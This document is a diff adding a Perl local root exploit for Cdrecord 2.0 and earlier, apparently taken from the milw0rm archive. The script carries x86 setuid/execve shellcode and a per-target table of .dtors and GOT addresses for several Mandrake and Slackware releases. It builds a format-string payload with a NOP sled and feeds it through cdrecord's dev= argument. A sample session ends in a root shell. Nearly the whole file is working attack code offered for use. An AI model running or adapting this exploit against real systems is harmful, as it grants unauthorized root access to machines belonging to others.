@@ -1,0 +1,79 @@
+#!/usr/bin/perl
+###########################################################
+# Cdrecord version 2.0 and < local root exploit.
+#
+#
+#   [wsxz@localhost buffer]$ perl priv8cdr.pl 4
+#   Using target number 4
+#   Using Mr .dtors 0x808c82c
+#   Cdrecord 2.0 (i586-mandrake-linux-gnu)
+#
+#   scsibus: -1 target: -1 lun: -1
+#   Warning: Open by 'devname' is unintentional and not supported.
+#   /usr/bin/cdrecord: No such file or directory. Cannot open '. Cannot open SCSI driver.
+#   /usr/bin/cdrecord: For possible targets try 'cdrecord -scanbus'. Make sure you are root.
+#   /usr/bin/cdrecord: For possible transport specifiers try 'cdrecord dev=help'.
+#   sh-2.05b# id
+#   uid=0(root) gid=0(root) groups=503(wsxz)
+#   sh-2.05b#
+#####################################################
+
+		    $shellcode =
+                    "\x31\xc0\x31\xdb\xb0\x17\xcd\x80".#setuid 0
+		    "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80".#setgid 0
+		    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89".
+                    "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c".
+                    "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff".
+                    "\xff\xff/bin/sh";
+
+		    $cdrecordpath = "/usr/bin/cdrecord";
+		    $nop = "\x90"; # x86 NOP
+                    $offset = 0; # Default offset to try.
+
+
+     if (@ARGV == 1 || @ARGV == 2) {
+                    $target = $ARGV[0];
+                    $offset = $ARGV[1];
+		    }else{
+		    printf(" Priv8security.com Cdrecord local root exploit!!\n");
+		    printf(" usage: $0 target\n");
+		    printf(" List of targets:\n");
+		    printf("      1 - Linux Mandrake 8.2 Cdrecord 1.11a15\n");
+                    printf("      2 - Linux Mandrake 9.0 Cdrecord 1.11a32\n");
+                    printf("      3 - Linux Slackware 8.1 Cdrecord 1.11a24 not suid by default!!!\n");
+		    printf("      4 - Linux Mandrake 9.1 Cdrecord 2.0\n");
+		    exit(1);
+		    }
+
+     if ( $target eq "1" ) {
+                   $retword = 0x0807af38; #Mr  .dtors ;)
+		   $fmtstring = "%.134727238x%x%x%x%x%x%x%x%x%n:";
+		    }
+     if ( $target eq "2" ) {
+                  # $retword = 0x08084578; #.dtors
+                   $retword = 0x08084684; #.GOT exit
+		   $fmtstring = "%.134769064x%x%x%x%x%x%x%x%x%n:";
+		    }
+      if ( $target eq "3" ) {
+                   $retword = 0x0807f658;
+                   $fmtstring =  "%.134745456x%x%x%x%x%x%x%x%x%x%x%n:";
+		    }
+       if ( $target eq "4" ) {
+                   $retword = 0x0808c82c; #.GOT exit
+		   $fmtstring = "%.134802669x%x%x%x%x%x%x%x%x%n:";
+		    }
+
+		    printf("Using target number %d\n", $target);
+                    printf("Using Mr .dtors 0x%x\n",$retword);
+
+		    $new_retword = pack('l', ($retword));
+		    $new_retshell = pack('l', ($retshell));
+                    $buffer2 = $new_retword;
+                    $buffer2 .= $nop x 150;
+                    $buffer2 .= $shellcode;
+                    $buffer2 .= $fmtstring;
+
+		    exec("$cdrecordpath dev='$buffer2' '$cdrecordpath'");
+
+
+# milw0rm.com [2003-05-14]
